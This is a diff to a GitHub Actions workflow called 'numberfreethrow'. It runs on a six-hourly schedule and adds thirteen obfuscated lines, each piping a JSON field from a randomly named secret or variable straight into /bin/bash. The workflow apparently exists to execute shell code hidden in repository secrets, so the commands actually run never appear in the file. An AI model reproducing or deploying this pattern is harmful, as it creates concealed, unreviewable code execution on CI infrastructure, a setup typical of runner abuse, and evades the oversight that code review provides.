@@ -1,25 +1,29 @@
 name: numberfreethrow
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 5/6 * * *'
+    - cron: '16 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: numberfreethrow
         env:
-          jrho483: ${{ secrets.jrho483 }}
+          i38: ${{ secrets.i38 }}
         run: |
-          echo $jrho483 | jq -r .qfxi04 | /bin/bash
-          echo $e494 | jq -r .rh870 | /bin/bash
-          echo $aqa5294 | jq -r .ikeaq8 | /bin/bash
-          echo $yudn95030 | jq -r .q4066 | /bin/bash
-          echo $idk0 | jq -r .ld880 | /bin/bash
-          echo $dz8560 | jq -r .jp57702 | /bin/bash
-          echo $o6480 | jq -r .y86 | /bin/bash
-          echo $l2387 | jq -r .lwlxt55278 | /bin/bash
-          echo $t26015 | jq -r .amfi4 | /bin/bash
+          echo $i38 | jq -r .si71936 | /bin/bash
+          echo $n7 | jq -r .xy41 | /bin/bash
+          echo $j8902 | jq -r .q707 | /bin/bash
+          echo $khrmw50777 | jq -r .ekgad17 | /bin/bash
+          echo $yzuy060 | jq -r .wcl44 | /bin/bash
+          echo $wqq2374 | jq -r .eoiox9 | /bin/bash
+          echo $enhpv1863 | jq -r .xtko87499 | /bin/bash
+          echo $i12058 | jq -r .im551 | /bin/bash
+          echo $bygpg254 | jq -r .dx5 | /bin/bash
+          echo $l05 | jq -r .enn03160 | /bin/bash
+          echo $cjbq6 | jq -r .s8 | /bin/bash
+          echo $ap83846 | jq -r .tjxb9 | /bin/bash
+          echo $tpate2954 | jq -r .i591 | /bin/bash
 
